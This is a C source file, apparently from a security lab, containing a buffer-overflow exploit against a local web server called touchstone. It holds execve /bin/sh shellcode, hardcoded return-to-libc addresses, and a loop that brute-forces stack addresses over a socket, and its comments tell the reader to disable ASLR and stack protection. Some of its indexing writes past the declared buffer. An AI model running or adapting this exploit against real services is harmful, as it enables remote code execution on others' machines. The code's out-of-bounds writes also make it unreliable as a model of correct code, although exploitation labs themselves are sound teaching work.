
/**
 *  运行touchstone时要关闭内存地址随机化，
 *  且touchstone编译时要加上-z execstack -fn-stack-protector
*/





#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/shm.h>
#define NOP 0x90
#define PORT  8989
int browser(int port,int stringaddr);
/*
** construct your shellcode
**create_shellcode.c will help you to create a shellcode.
**fill in it there	 
*/
  const char shellcode[] = "\x31\xc0"
  "\x50"
  "\x68""//sh"
  "\x68""/bin"
  "\x89\xe3"
  "\x50"
  "\x53"
  "\x89\xe1"
  "\x99"
  "\xb0\x0b"
  "\xcd\x80" ;
  
  
  
 int main(int argc,char *argv[])
 {
   int port=PORT,addr=0xbffff400;
   if(argc>1) port=atoi(argv[1]);
   for(addr=0xbffff400;addr<=0xbffff600;addr++)
        browser(port,addr);
   
 }
int browser(int port,int stringaddr)
{
  
  int sock_client = socket(AF_INET,SOCK_STREAM, 0);//sock fd
   struct sockaddr_in addr;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_port = htons(port);  //server port
  
  addr.sin_addr.s_addr = inet_addr("127.0.0.1");  ///server ip address

  
  if (connect(sock_client, (struct sockaddr *)&addr, sizeof(addr)) < 0)
    {
      perror("connect");
      exit(1);
    }
 
  printf("sock_client = %d\n",sock_client);
  char uri[1065];
  long *addr_s;
  int i;
  addr_s=(long *)uri;
  for(i=0;i<266;i++)
	 addr_s[i]=0xb7e5f060;      //system的地址
	 addr_s[i++]=0xb7e52be0;    //exit的地址
   addr_s[i]= stringaddr;     //system的地址参数的地址
  for(i=0;i<strlen(shellcode);i++)
           uri[i]=shellcode[i];
     uri[1073]='\0';
     uri[1072]=' ';
     write(sock_client,uri,strlen(uri));    
// char resp[1024];
// int num = 0;
// while(read (sock_client, &resp[num], 1))
//	num++;
//  resp[num] = 0;
//  printf("Response = %s\n",resp);
  close(sock_client);
//  printf("have closed socket\n");
  return 0;
}
